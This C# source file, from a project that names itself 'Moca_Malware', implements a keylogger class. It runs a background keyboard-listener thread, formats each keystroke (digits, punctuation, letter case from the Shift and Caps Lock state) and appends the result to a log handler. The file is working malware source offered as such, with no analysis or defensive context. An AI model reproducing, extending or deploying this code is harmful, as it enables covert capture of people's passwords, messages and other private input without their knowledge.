using System;
using System.Threading;
using System.Windows.Forms;

namespace Moca_Malware
{
    class Keylogger
    {
        private KeyboardListener keyboardListener;
        private Thread keyboardListenerThread;
        
        public Keylogger()
        {
            keyboardListener = new KeyboardListener();
            keyboardListenerThread = new Thread(keyboardListener.listenForAnyPress);
        }

        private string formatKey(Keys key)
        {
            string keyAsString = key.ToString();

            switch (key)
            {
                case Keys.Space:
                    keyAsString = " ";
                    break;

                case Keys.D0:
                case Keys.D1:
                case Keys.D2:
                case Keys.D3:
                case Keys.D4:
                case Keys.D5:
                case Keys.D6:
                case Keys.D7:
                case Keys.D8:
                case Keys.D9:
                    keyAsString = keyAsString.Replace("D", "");
                    break;

                case Keys.Oemtilde:
                    keyAsString = "@";
                    break;

                case Keys.OemPeriod:
                    keyAsString = ".";
                    break;

                case Keys.Oemcomma:
                    keyAsString = ",";
                    break;
            }

            if (keyAsString.Length > 1)
                keyAsString = "{{" + keyAsString + "}}";
            else
                if (uppercase())
                    keyAsString = keyAsString.ToUpper();
                else
                    keyAsString = keyAsString.ToLower();
            return keyAsString;
        }

        public void startListening()
        {
            keyboardListener.isListening = true;
            keyboardListenerThread.Start();
            keyboardListener.OnKeyPressed += key => {
                KeyboardLogHandler.appendText(formatKey(key));
            };
        }

        private bool capsLock
        {
            get { return Control.IsKeyLocked(Keys.CapsLock); }
        }

        private bool shitKey
        {
            get { return Convert.ToBoolean(KeyboardListener.GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        }

        private bool uppercase()
        {
            if (shitKey && capsLock)
                return false;

            if (!shitKey && !capsLock)
                return false;

            if (!shitKey && capsLock)
                return true;

            if (shitKey && !capsLock)
                return true;

            return false;
        }
    }
}
